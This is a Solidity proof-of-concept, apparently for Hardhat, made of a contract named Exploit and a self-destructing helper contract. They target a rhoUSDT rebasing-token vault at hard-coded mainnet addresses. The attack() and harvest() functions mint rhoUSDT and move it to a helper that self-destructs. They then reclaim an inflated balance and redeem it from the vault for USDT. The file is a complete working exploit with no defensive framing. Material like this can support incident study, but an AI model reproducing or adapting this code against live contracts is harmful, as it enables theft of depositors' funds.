pragma solidity ^0.8.0;

import "hardhat/console.sol";
interface IVault {
    function mint(uint256 amount) external;
    function redeem(uint256 amount) external;
}
interface IRhoToken  {
    function getMultiplier() external view returns (uint256 multiplier, uint256 lastUpdate);
    function setRebasingOption(bool isRebasing) external;
    function adjustedRebasingSupply() external view returns (uint256);
}
interface IERC20{
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

contract SelfDestructContract {

    address rhoUSDT = 0xD845dA3fFc349472fE77DFdFb1F93839a5DA8C96;
    constructor(){
         IERC20(rhoUSDT).approve(msg.sender, 2**256 - 1);
    }

    function selfDestruct() external {
        selfdestruct(payable(msg.sender));
    }
}

contract Exploit{
    
    address vault = 0x4BAd4D624FD7cabEeb284a6CC83Df594bFDf26Fd;
    address rhoUSDT = 0xD845dA3fFc349472fE77DFdFb1F93839a5DA8C96;
    address USDT = 0x55d398326f99059fF775485246999027B3197955;

    SelfDestructContract tmp;

    function printCodeSize(address account) internal{
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        console.log("Code size", size);
    }    
    function attack() external{
        IERC20(rhoUSDT).approve(vault, 2**256 - 1);
        IERC20(USDT).approve(vault, 2**256 - 1);

        uint256 rebasingSupply = IRhoToken(rhoUSDT).adjustedRebasingSupply();
        (uint256 multiplier, ) = IRhoToken(rhoUSDT).getMultiplier();
        uint256 amount = rebasingSupply * 1e36 / multiplier;

        console.log("rebasingSupply", rebasingSupply);
        console.log("multiplier", multiplier);
        console.log("transfering", amount);

        IVault(vault).mint(amount);
        tmp = new SelfDestructContract();
        printCodeSize(address(tmp));

        IERC20(rhoUSDT).transfer(address(tmp), amount);
        tmp.selfDestruct();

        printCodeSize(address(tmp));
        console.log("tmp rebasing balance", IERC20(rhoUSDT).balanceOf(address(tmp)));
    }

    function harvest() external {

        printCodeSize(address(tmp));
        console.log("tmp non-rebasing balance", IERC20(rhoUSDT).balanceOf(address(tmp)));

        IERC20(rhoUSDT).transferFrom(
            address(tmp), 
            address(this),
            IERC20(rhoUSDT).balanceOf(address(tmp))
        );

        IVault(vault).redeem(IERC20(rhoUSDT).balanceOf(address(this)));
        uint256 rebasingSupply = IRhoToken(rhoUSDT).adjustedRebasingSupply();
        console.log("rebasingSupply", rebasingSupply);
    }
}
